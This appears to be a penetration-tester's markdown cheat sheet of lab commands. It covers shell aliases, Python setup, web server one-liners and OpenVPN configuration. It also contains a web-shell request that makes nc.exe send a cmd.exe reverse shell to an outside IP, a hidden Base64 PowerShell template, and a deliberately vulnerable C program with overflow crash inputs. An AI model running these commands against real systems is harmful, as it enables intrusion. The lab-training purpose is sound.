## Miscellaneous Commands
### Table of Contents
* [General Tips](#general-tips)
* [Windows Command Shell](#windows-command-shell)
  * [Search the Entire Filesystem for a File](#search-the-entire-filesystem-for-a-file)
  * [Get the Kernel Version](#get-the-kernel-version)
* [Windows PowerShell](#windows-powershell)
  * [One-Liner Syntax](#one-liner-syntax)
* [Bourne-Again Shell (BASH)](#bourne-again-shell-bash)
  * [Keyboard Shortcuts](#keyboard-shortcuts)
  * [Create a Command Alias](#create-a-command-alias)
  * [Environment Variables](#environment-variables)
  * [Rename Multiple Files](#rename-multiple-files)
  * [Invoke Another Shell](#invoke-another-shell)
  * [Send Multiple Files via SSH](#send-multiple-files-via-ssh)
  * [Download Multiple Files Using Wget](#download-multiple-files-using-wget)
* [Python](#python)
  * [Pyenv](#pyenv)
  * [Pip](#pip)
  * [Splitting a Long String](#splitting-a-long-string)
* [OpenVPN](#openvpn)
* [Compiling Vulnerable C Code](#compiling-vulnerable-c-code)

### General Tips
* Avoid calling PowerShell from a Netcat-provided cmd.exe shell. 
* To upgrade your shell to a fully-functional PTY on Windows, try using nc.exe instead of a Msfvenom reverse shell.
* If you get the error below via a web shell, change the LPORT variable of your exploit. 
```
/*
Warning: fread() expects parameter 1 to be resource, bool given in C:\xampp\htdocs\rshell.php on line 74

Warning: fclose() expects parameter 1 to be resource, bool given in C:\xampp\htdocs\rshell.php on line 89
```

### Windows Command Shell
#### Search the Entire Filesystem for a File 
```pwsh
dir "\network-secret.txt" /s
```

#### Get the Kernel Version
```pwsh
systeminfo | findstr Build
```
```pwsh
# output
OS Version:                10.0.17763 N/A Build 17763
```

### PowerShell
#### One-Liner Syntax
* -nop = No Profile (do not load the user's PowerShell profile)
* -w hidden = WindowsStyle is Hidden (do not open a window during execution)
* -e = Encoded Command (execute the following Base64 string as a command)
```bash
powershell.exe -nop -w hidden -e abcdcef...
```

#### Using a Web Shell
```bash
cmd.php?cmd=powershell.exe -c "c:\xampp\htdocs\nc.exe 192.168.49.58 45443 -e 'cmd.exe'"
```

### Bourne-Again Shell (BASH)
#### Create a Command Alias
Zsh
```bash
echo "alias cls='cls'" >> .zshrc # just me
echo "alias cls='cls'" >> /etc/zsh/zshrc # for all users
```

BASH
```bash
echo "alias cls='cls'" >> .bash_aliases # just me
echo "alias cls='cls'" >> /etc/bash.bashrc # for all users
```

**Login Shells (the GUI)**
```bash
echo "alias cls='cls'" >> .profile # just me
echo "alias cls='cls'" >> /etc/profile # for all users
```

#### Environment Variables
PS1
```bash
# how to change it to the previously less flashy one
vim .bashrc
# search for PS1 using /PS1
# comment-out PS1=$prompt_color...
# un-comment the line beneath BackTrack red prompt
```

#### Shell
How to change it from ZSH to BASH.
```bash
chsh -s /bin/bash
sudo reboot now
```

#### Rename Multiple Files
```bash
for FILE in *alpha*; do mv $FILE "${FILE/alpha/beta}"; done
```

#### Invoke Another Shell
This example allows you to invoke another shell Without opening another terminal (ex: after updating your .bashrc/.zshrc files).
```bash
exec "$SHELL"
```

#### Send Multiple Files via SSH
```bash
scp -r software/ victor@$TARGET:~/
```

#### Download Multiple Files Using Wget
```bash
wget -r http://$TARGET/$FOLDER -O $FOLDER
```

#### Web Server One-Liners
```bash
python -m SimpleHttpServer 5050
```
```bash
python3 -m http.server 5050
```
```bash
php -S 0.0.0.0:5050
```
```bash
ruby -run -e httpd . -p 5050
```
```bash
busybox httpd -f -p 5050
```

#### Keyboard Shortcuts
```bash
CTRL+E # jump to end of line
CTRL+A # jump to beginning of line
CTRL+X+DEL # delete all text typed, from right to left
```

#### Screenshots
* PrtSc – Save a screenshot of the entire screen to the “Pictures” directory.
* Shift + PrtSc – Save a screenshot of a specific region to Pictures.
* Alt + PrtSc  – Save a screenshot of the current window to Pictures.
* Ctrl + PrtSc – Copy the screenshot of the entire screen to the clipboard.
* Shift + Ctrl + PrtSc – Copy the screenshot of a specific region to the clipboard.
* Ctrl + Alt + PrtSc – Copy the screenshot of the current window to the clipboard.

### Python
#### Pyenv
```bash
sudo apt-get install -y make build-essential libssl-dev zlib1g-dev libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev libncursesw5-dev xz-utils tk-dev libffi-dev liblzma-dev python-openssl*
curl https://pyenv.run | bash
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init --path)"' >> ~/.bashrc
echo 'eval "$(pyenv virtualenv-init -)"' >> ~/.bashrc
exec "$SHELL"
pyenv install 3.9.5
pyenv install 2.7.18
pyenv global 2.7.18
```

#### Pip
```bash
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
python get-pip.py
python -m pip --version
python -m pip install --upgrade setuptools
python -m pip install pysmb
python -m pip install pycryptodome
```

#### Splitting a Long String
```python
long_string = "<long string goes here>"
chunk_size = 25
for i in range(0, len(long_string), chunk_size):
    print("long_string = long_string + " + '"' + str[i:i+chunk_size] + '"')
```

### OpenVPN
#### Configuring a Password File
```bash
echo "victor" >> creds.txt
echo "SuperStrongPassPhrase" >> creds.txt

chmod u+r creds.txt
chmod go-rwx creds.txt

sed -i '15 i\auth-user-pass creds.txt' pwk-labs.ovpn # insert this line before the 15th line
sudo openvpn pwk-labs.ovpn
```

### Compiling Vulnerable C Code
#### How to Invoke the Vim Text-Editor
```bash
vim bof.c
```

#### Vulnerable C Code
```c
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char BUFFER[64];

    if (argc <2) {
        printf("[x] Error: You must provide at least one argument.\n");
        return 1; 
    }
    
    strcpy(BUFFER, argv[1]);
    printf(BUFFER);
    printf("\n");
}
```

#### How to Compile the Code Above
```
gcc bof.c -o bof
```

#### How to Run the Resulting, Compiled Program (Example 1)
```bash
./bof hello
```
```bash
# output
hello
```

#### How to Run the Resulting, Compiled Program (Example 2)
```bash
./bof $(printf 'A%.0s' {1..64})
```
```bash
# output
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

#### How to Crash the Resulting, Compiled Program
```bash
./bof $(printf 'A%.0s' {1..72})
```
```bash
# output
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```
